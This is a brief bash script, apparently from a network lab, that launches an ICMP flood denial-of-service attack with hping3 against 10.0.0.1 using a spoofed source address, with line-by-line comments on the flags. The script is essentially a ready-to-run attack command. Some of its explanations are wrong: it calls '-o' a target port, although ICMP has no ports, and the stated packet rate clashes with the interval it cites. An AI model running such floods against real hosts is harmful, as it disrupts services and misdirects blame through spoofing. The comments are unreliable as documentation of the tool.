#!/bin/bash
#
# implements the Dos attack via ICMP flooding with spoofed source IP address

#while true 
#do
    hping3 -V --icmp --faster -o 44140 10.0.0.1 -c 2000 --spoof 10.0.0.4 &      
    sleep 120
#done

# hping3 command explained argument-for-argument
## -V: verbose mode
## --icmp: ICMP mode/protocol to use=ICMP
## --faster: alias for -i u1000=sends 100 packets per second
## -o 44140: target port 44140
## 10.0.0.1: target host=10.0.0.1
## -c 2000: packet count=2000

## --spoof 10.0.0.4: spoof source address=10.0.0.4

